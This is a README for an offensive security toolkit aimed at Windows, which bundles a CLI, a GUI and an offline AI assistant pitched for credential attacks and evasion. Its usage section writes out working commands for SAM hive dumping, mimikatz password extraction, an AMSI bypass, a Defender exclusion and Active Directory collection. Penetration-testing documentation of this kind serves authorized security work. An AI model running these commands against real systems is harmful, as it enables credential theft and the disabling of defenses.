# NullSec Linux - NULLSEC FRAMEWORK v2.0 - WINDOWS EDITION
## Advanced Offensive Security Operations for Windows
### Compatible with NullSec Linux 1.0 (void)

═══════════════════════════════════════════════════════════════════════════════

## 🚀 QUICK START

### Installation
```cmd
# Run the installer
install-windows.bat

# Or manually install dependencies
pip install requests colorama pyqt5
```

### Launch
```cmd
# Command Line Interface
python nullsec-launcher-windows.py

# AI-Powered Assistant
python nullsec-ai-windows.py

# Desktop GUI
python nullsec-desktop-windows.py
```

═══════════════════════════════════════════════════════════════════════════════

## 📦 COMPONENTS

### 1. NULLSEC Launcher (CLI)
Windows command-line interface for attack modules.

Features:
- Auto-discovery of PowerShell attack modules
- Built-in Windows enumeration tools
- Category-based module organization
- Search functionality

### 2. NULLSEC AI v3.0
AI-powered pentesting assistant optimized for Windows.

Features:
- **NO API KEYS REQUIRED** - Works 100% offline
- Windows-specific attack prompts
- Active Directory expertise
- Credential attack guidance
- Evasion technique suggestions
- PowerShell command generation

Categories:
- `windows` - Windows exploitation
- `active_directory` - AD attacks
- `credentials` - Password/hash attacks
- `evasion` - Bypass techniques
- `network` - Network attacks
- `web` - Web exploitation

### 3. NULLSEC Desktop (GUI)
Graphical interface for Windows.

Features:
- PyQt5 dark theme interface
- Module browser with categories
- Real-time command output
- PowerShell integration
- AI console access

═══════════════════════════════════════════════════════════════════════════════

## 🤖 AI SETUP (Optional but Recommended)

### Install Ollama for Windows
```cmd
# Using winget
winget install Ollama.Ollama

# Or download from https://ollama.com/download
```

### Install AI Models
```cmd
# Recommended model for pentesting
ollama pull deepseek-coder:6.7b

# Additional models
ollama pull mistral:7b
ollama pull codellama:13b
```

### Verify Installation
```cmd
ollama list
```

═══════════════════════════════════════════════════════════════════════════════

## 💻 USAGE EXAMPLES

### AI-Assisted Pentesting
```
nullsec-ai> set target 192.168.1.100
nullsec-ai> set category windows
nullsec-ai> enumerate local privileges
nullsec-ai> find UAC bypass methods
nullsec-ai> generate mimikatz commands for credential dumping
```

### Windows Enumeration
```cmd
# System info
systeminfo && whoami /all

# Network info
ipconfig /all && netstat -ano

# Users and groups
net user && net localgroup administrators

# Services
wmic service list brief | findstr Running
```

### Active Directory
```cmd
# Domain enumeration
nltest /dclist:
net user /domain
net group "Domain Admins" /domain

# BloodHound collection
SharpHound.exe -c All --zipfilename loot.zip
```

### Credential Access
```cmd
# SAM dump (requires admin)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### Evasion
```powershell
# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Defender exclusion
Add-MpPreference -ExclusionPath 'C:\Tools'
```

═══════════════════════════════════════════════════════════════════════════════

## 📁 FILE STRUCTURE

```
nullsec-windows/
├── install-windows.bat          # Windows installer
├── nullsec-launcher-windows.py  # CLI launcher
├── nullsec-ai-windows.py        # AI assistant
├── nullsec-desktop-windows.py   # Desktop GUI
├── README-WINDOWS.md            # This file
└── powershell-modules/          # PowerShell attack scripts
```

═══════════════════════════════════════════════════════════════════════════════

## ⚙️ REQUIREMENTS

### System
- Windows 10/11 (64-bit)
- Python 3.8+
- PowerShell 5.1+

### Python Packages
- requests
- colorama
- pyqt5 (optional, for GUI)

### Optional
- Ollama (for AI support)
- 4GB+ RAM (8GB recommended for AI)
- 10GB+ storage (50GB for all AI models)

═══════════════════════════════════════════════════════════════════════════════

## 🔧 TROUBLESHOOTING

### Python not found
1. Download Python from https://www.python.org/downloads/
2. Check "Add Python to PATH" during installation
3. Restart terminal

### PowerShell execution blocked
```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
```

### Ollama not starting
```cmd
# Start Ollama service
ollama serve

# In another terminal
ollama list
```

### ANSI colors not working
Run in Windows Terminal or PowerShell 7+

═══════════════════════════════════════════════════════════════════════════════

## ⚠️ LEGAL DISCLAIMER

This framework is for **AUTHORIZED SECURITY TESTING ONLY**.

- Always obtain written permission before testing
- Only test systems you own or have authorization for
- Follow responsible disclosure practices
- Comply with all applicable laws

The developers are not responsible for misuse of this tool.

═══════════════════════════════════════════════════════════════════════════════

## 📞 SUPPORT

- GitHub: github.com/bad-antics
- Documentation: See NULLSEC_COMMANDS_REFERENCE.md

═══════════════════════════════════════════════════════════════════════════════
                    NULLSEC Framework v2.0 | bad-antics
═══════════════════════════════════════════════════════════════════════════════
